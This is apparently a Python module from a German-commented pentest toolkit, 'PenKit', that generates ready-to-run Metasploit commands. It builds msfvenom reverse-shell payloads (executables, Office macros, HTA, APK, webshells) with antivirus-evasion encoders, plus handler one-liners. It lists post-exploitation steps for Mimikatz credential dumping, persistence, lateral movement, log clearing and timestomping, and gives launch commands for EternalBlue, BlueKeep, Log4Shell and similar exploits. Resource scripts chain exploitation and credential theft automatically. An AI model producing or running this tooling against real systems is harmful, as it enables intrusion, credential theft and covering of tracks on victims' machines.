"""
Metasploit Framework Integration — vollständiger MSF-Workflow in PenKit.

Module:
  1. msfvenom Payload-Generator    — alle gängigen Payloads + AV-Bypass
  2. Multi/Handler starten         — fertiger msfconsole-Befehl
  3. Post-Exploitation Module      — hashdump, getsystem, migrate, etc.
  4. Common Exploit Modules        — Top-Exploits mit fertigen Befehlen
  5. Resource Script Generator     — .rc Datei für vollautomatische Angriffe
  6. MSF-DB Setup                  — postgresql + msfdb init

Alle Befehle laufen auf Kali — kein Upload nötig.
"""

from __future__ import annotations
from typing import AsyncGenerator
import textwrap


# ── msfvenom Payloads ─────────────────────────────────────────────────────────

PAYLOAD_FORMATS = {
    "windows_exe":       ("windows/x64/meterpreter/reverse_tcp",  "exe",   "Windows 64-bit EXE"),
    "windows_dll":       ("windows/x64/meterpreter/reverse_tcp",  "dll",   "Windows DLL (Injection)"),
    "windows_ps1":       ("windows/x64/meterpreter/reverse_https", "ps1",  "PowerShell (HTTPS, AV-Bypass)"),
    "windows_hta":       ("windows/x64/meterpreter/reverse_tcp",  "hta",   "HTA (Doppelklick → Shell)"),
    "windows_vba":       ("windows/x64/meterpreter/reverse_tcp",  "vba",   "Office Macro (Word/Excel)"),
    "windows_aspx":      ("windows/x64/meterpreter/reverse_tcp",  "aspx",  "ASPX Webshell"),
    "linux_elf":         ("linux/x64/meterpreter/reverse_tcp",    "elf",   "Linux ELF Binary"),
    "linux_bash":        ("cmd/unix/reverse_bash",                 "sh",    "Bash Reverse Shell"),
    "android_apk":       ("android/meterpreter/reverse_tcp",      "apk",   "Android APK"),
    "macos_macho":       ("osx/x64/meterpreter/reverse_tcp",      "macho", "macOS Mach-O Binary"),
    "java_war":          ("java/meterpreter/reverse_tcp",         "war",   "Java WAR (Tomcat)"),
    "php_webshell":      ("php/meterpreter_reverse_tcp",          "php",   "PHP Webshell"),
}

AV_BYPASS_FLAGS = {
    "none":       "",
    "shikata":    "-e x86/shikata_ga_nai -i 5",
    "xor":        "-e x64/xor_dynamic -i 3",
    "template":   "-x /usr/share/windows-binaries/plink.exe -k",
}


def msfvenom_cmd(
    lhost: str,
    lport: int,
    payload_type: str = "windows_exe",
    output_name: str = "",
    av_bypass: str = "none",
    extra_opts: str = "",
) -> str:
    """Generiert fertigen msfvenom-Befehl."""
    if payload_type not in PAYLOAD_FORMATS:
        payload_type = "windows_exe"

    payload, fmt, desc = PAYLOAD_FORMATS[payload_type]
    out = output_name or f"payload.{fmt}"
    bypass = AV_BYPASS_FLAGS.get(av_bypass, "")

    cmd = (
        f"msfvenom -p {payload} "
        f"LHOST={lhost} LPORT={lport} "
        f"-f {fmt} "
        f"{bypass} "
        f"{extra_opts} "
        f"-o {out}"
    ).strip()

    return cmd


async def generate_payload_menu(
    lhost: str,
    lport: int,
    scenario: str = "all",
) -> AsyncGenerator[str, None]:
    """Zeigt alle relevanten Payloads für ein Szenario."""
    yield f"\033[1;36m[*] msfvenom Payloads — LHOST={lhost} LPORT={lport}\033[0m\n"

    groups = {
        "Windows": ["windows_exe", "windows_ps1", "windows_hta", "windows_vba", "windows_dll"],
        "Linux": ["linux_elf", "linux_bash"],
        "Web": ["windows_aspx", "java_war", "php_webshell"],
        "Mobile": ["android_apk"],
    }

    if scenario != "all":
        groups = {k: v for k, v in groups.items() if k.lower() == scenario.lower()}

    for platform, types in groups.items():
        yield f"\033[33m[{platform}]\033[0m"
        for pt in types:
            _, fmt, desc = PAYLOAD_FORMATS[pt]
            cmd = msfvenom_cmd(lhost, lport, pt)
            yield f"  \033[90m{desc}:\033[0m"
            yield f"  \033[36m{cmd}\033[0m"
            yield ""


# ── Multi/Handler ─────────────────────────────────────────────────────────────

def handler_cmd(
    lhost: str,
    lport: int,
    payload: str = "windows/x64/meterpreter/reverse_tcp",
    exit_on_session: bool = False,
) -> str:
    """Fertiger msfconsole Multi/Handler Einzeiler."""
    exit_flag = "true" if exit_on_session else "false"
    return (
        f"msfconsole -q -x \""
        f"use exploit/multi/handler; "
        f"set PAYLOAD {payload}; "
        f"set LHOST {lhost}; "
        f"set LPORT {lport}; "
        f"set ExitOnSession {exit_flag}; "
        f"set EnableStageEncoding true; "
        f"exploit -j\""
    )


def handler_rc_file(
    lhost: str,
    lport: int,
    payload: str = "windows/x64/meterpreter/reverse_tcp",
    rc_path: str = "/tmp/handler.rc",
) -> tuple[str, str]:
    """Erstellt Handler Resource Script + Startbefehl."""
    rc_content = f"""use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set EnableStageEncoding true
set AutoRunScript post/multi/manage/shell_to_meterpreter
exploit -j
"""
    start_cmd = f"msfconsole -q -r {rc_path}"
    return rc_content, start_cmd


# ── Post-Exploitation Module ──────────────────────────────────────────────────

POST_MODULES = {
    "Privilege Escalation": {
        "getsystem":           "getsystem  # Named Pipe / Token Dup / Service",
        "local_exploit_sugg":  "run post/multi/recon/local_exploit_suggester",
        "bypassuac_fodhelper": "use post/windows/escalate/bypassuac_fodhelper; run",
        "getsystem_service":   "use post/windows/escalate/getsystem; run",
    },
    "Credential Harvesting": {
        "hashdump":            "hashdump  # SAM Datenbank",
        "kiwi (Mimikatz)":     "load kiwi; creds_all  # LSASS Passwords/Hashes",
        "lsa_secrets":         "run post/windows/gather/lsa_secrets",
        "credentials_all":     "run post/windows/gather/credentials/credential_collector",
        "browser_creds":       "run post/windows/gather/enum_chrome; run post/windows/gather/enum_firefox",
        "wifi_passwords":      "run post/windows/wlan/wlan_profile",
    },
    "Persistence": {
        "reg_persistence":     "run post/windows/manage/persistence_exe STARTUP=SCHEDULER",
        "scheduled_task":      "run post/windows/manage/persistence EXE_PATH=/tmp/payload.exe",
        "service":             "run post/windows/manage/persistence STARTUP=SERVICE",
    },
    "Enumeration": {
        "sysinfo":             "sysinfo",
        "ps (Prozesse)":       "ps",
        "arp (Netzwerk)":      "arp",
        "route (Routing)":     "run post/multi/manage/autoroute ACTION=PRINT",
        "av_check":            "run post/windows/gather/enum_av_excluded",
        "share_enum":          "run post/windows/gather/enum_shares",
        "domain_enum":         "run post/windows/gather/enum_domain",
        "logged_on_users":     "run post/windows/gather/enum_logged_on_users",
    },
    "Lateral Movement": {
        "autoroute":           "run post/multi/manage/autoroute SUBNET=192.168.1.0/24",
        "socks_proxy":         "use auxiliary/server/socks_proxy; set VERSION 5; set SRVPORT 1080; run -j",
        "port_fwd":            "portfwd add -l 4445 -p 3389 -r 192.168.1.100",
        "token_steal":         "steal_token <PID>  # PID von winlogon/explorer",
    },
    "Cleanup": {
        "clearev (Logs löschen)": "clearev",
        "timestomp":           "timestomp -r C:\\\\Windows\\\\Temp\\\\payload.exe",
        "rm payload":          "rm C:\\\\Windows\\\\Temp\\\\payload.exe",
    },
}


async def show_post_modules(category: str = "all") -> AsyncGenerator[str, None]:
    yield "\033[1;36m[*] Meterpreter Post-Exploitation Module:\033[0m\n"

    cats = POST_MODULES if category == "all" else {
        k: v for k, v in POST_MODULES.items()
        if category.lower() in k.lower()
    }

    for cat, modules in cats.items():
        yield f"\033[33m  [{cat}]\033[0m"
        for name, cmd in modules.items():
            yield f"    \033[90m{name}:\033[0m"
            yield f"    \033[36m  {cmd}\033[0m"
        yield ""


# ── Top Exploit Modules ────────────────────────────────────────────────────────

TOP_EXPLOITS = [
    {
        "name": "EternalBlue (MS17-010)",
        "module": "exploit/windows/smb/ms17_010_eternalblue",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "desc": "SMB RCE — XP/7/2008/2012 (ungepatcht). WannaCry-Exploit.",
        "danger": "⛔",
        "options": {"RHOSTS": "<target>", "LHOST": "<kali>", "LPORT": "4444"},
    },
    {
        "name": "BlueKeep RDP (CVE-2019-0708)",
        "module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "desc": "RDP RCE ohne Auth — Win7/2008 (ungepatcht).",
        "danger": "⛔",
        "options": {"RHOSTS": "<target>", "LHOST": "<kali>"},
    },
    {
        "name": "PrintNightmare (CVE-2021-34527)",
        "module": "exploit/windows/local/cve_2021_34527_printnightmare",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "desc": "LPE via Print Spooler — Win10/Server 2019. Lokal oder Remote.",
        "danger": "⛔",
        "options": {"SESSION": "<session>", "LHOST": "<kali>"},
    },
    {
        "name": "Log4Shell (CVE-2021-44228)",
        "module": "exploit/multi/misc/log4shell_header_injection",
        "payload": "java/meterpreter/reverse_tcp",
        "desc": "Log4j RCE — Java-Apps (Minecraft, VMware, Elasticsearch...).",
        "danger": "⛔",
        "options": {"RHOSTS": "<target>", "LHOST": "<kali>", "RPORT": "8080"},
    },
    {
        "name": "SMB PSExec (PTH)",
        "module": "exploit/windows/smb/psexec",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "desc": "Shell via SMB + Credentials/Hash. Klassisch, oft AV-erkannt.",
        "danger": "🔴",
        "options": {"RHOSTS": "<target>", "SMBUser": "<user>", "SMBPass": "<hash>", "LHOST": "<kali>"},
    },
    {
        "name": "MS08-067 Netapi",
        "module": "exploit/windows/smb/ms08_067_netapi",
        "payload": "windows/meterpreter/reverse_tcp",
        "desc": "SMB RCE — WindowsXP/2003. Sehr alt aber noch in alten Netzen.",
        "danger": "⛔",
        "options": {"RHOSTS": "<target>", "LHOST": "<kali>"},
    },
    {
        "name": "Apache Struts RCE (CVE-2017-5638)",
        "module": "exploit/multi/http/struts2_content_type_ognl",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "desc": "HTTP Content-Type Header RCE — Struts 2.x (Equifax-Hack).",
        "danger": "⛔",
        "options": {"RHOSTS": "<target>", "RPORT": "8080", "LHOST": "<kali>"},
    },
    {
        "name": "Shellshock (CVE-2014-6271)",
        "module": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "desc": "Bash CGI RCE via HTTP Header — Apache + CGI-Scripts.",
        "danger": "🔴",
        "options": {"RHOSTS": "<target>", "TARGETURI": "/cgi-bin/test.cgi", "LHOST": "<kali>"},
    },
]


async def show_top_exploits(lhost: str = "<kali>", lport: int = 4444) -> AsyncGenerator[str, None]:
    yield "\033[1;36m[*] Top Metasploit Exploits:\033[0m\n"

    for e in TOP_EXPLOITS:
        yield f"  {e['danger']} \033[33m{e['name']}\033[0m"
        yield f"    \033[90m{e['desc']}\033[0m"
        opts = "; ".join(f"set {k} {v}" for k, v in e["options"].items())
        opts = opts.replace("<kali>", lhost)
        cmd = (
            f"msfconsole -q -x \"use {e['module']}; "
            f"{opts}; set PAYLOAD {e['payload']}; set LHOST {lhost}; "
            f"set LPORT {lport}; run\""
        )
        yield f"    \033[36m{cmd[:120]}{'...' if len(cmd) > 120 else ''}\033[0m"
        yield ""


# ── Resource Script Generator ─────────────────────────────────────────────────

def build_resource_script(
    lhost: str,
    lport: int,
    target: str,
    module: str = "exploit/windows/smb/ms17_010_eternalblue",
    payload: str = "windows/x64/meterpreter/reverse_tcp",
    post_modules: list[str] | None = None,
) -> str:
    """
    Generiert ein vollständiges MSF Resource Script (.rc Datei).
    Automatisch: Exploit → Handler → Post-Exploit Module.
    Starten: msfconsole -r script.rc
    """
    if post_modules is None:
        post_modules = [
            "run post/multi/recon/local_exploit_suggester",
            "run post/windows/gather/credentials/credential_collector",
            "run post/windows/gather/enum_domain",
            "run post/multi/manage/autoroute SUBNET=192.168.0.0/16",
        ]

    post_block = "\n".join(post_modules)

    return f"""# PenKit Auto-Exploit Resource Script
# Ziel: {target} | LHOST: {lhost}:{lport}
# Starten: msfconsole -r /tmp/penkit_auto.rc

spool /tmp/msf_output.log

use {module}
set RHOSTS {target}
set LHOST {lhost}
set LPORT {lport}
set PAYLOAD {payload}
set EnableStageEncoding true
set AutoRunScript multi_console_command -rc /tmp/post.rc
exploit -j

# Handler für weitere Sessions
use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""


def build_post_rc(post_modules: list[str] | None = None) -> str:
    """Post-Exploitation Resource Script — wird nach Session automatisch ausgeführt."""
    if post_modules is None:
        post_modules = [
            "sysinfo",
            "getuid",
            "getsystem",
            "hashdump",
            "run post/windows/gather/credentials/credential_collector",
            "run post/multi/manage/autoroute SUBNET=192.168.0.0/16",
            "run post/windows/gather/enum_domain",
            "run post/windows/gather/enum_logged_on_users",
        ]

    return "\n".join(post_modules)


# ── MSF-DB Setup ──────────────────────────────────────────────────────────────

async def setup_msfdb() -> AsyncGenerator[str, None]:
    """Richtet Metasploit-Datenbank ein (postgresql + msfdb)."""
    from core.runner import CommandRunner
    runner = CommandRunner()

    yield "\033[1;36m[*] Metasploit DB Setup\033[0m\n"

    yield "\033[33m[1] PostgreSQL starten...\033[0m"
    async for line in runner.run(["service", "postgresql", "start"]):
        yield f"    {line}"

    yield "\033[33m[2] msfdb init...\033[0m"
    async for line in runner.run(["msfdb", "init"]):
        yield f"    {line}"

    yield "\033[33m[3] Verbindung testen...\033[0m"
    async for line in runner.run(["msfdb", "status"]):
        yield f"    {line}"

    yield ""
    yield "\033[32m[✓] MSF-DB bereit. In msfconsole: 'db_status' zum Prüfen.\033[0m"
    yield "\033[36m[→] Hosts nach Scan importieren: db_import /tmp/nmap_scan.xml\033[0m"
    yield "\033[36m[→] Hosts anzeigen: hosts\033[0m"
    yield "\033[36m[→] Services anzeigen: services\033[0m"
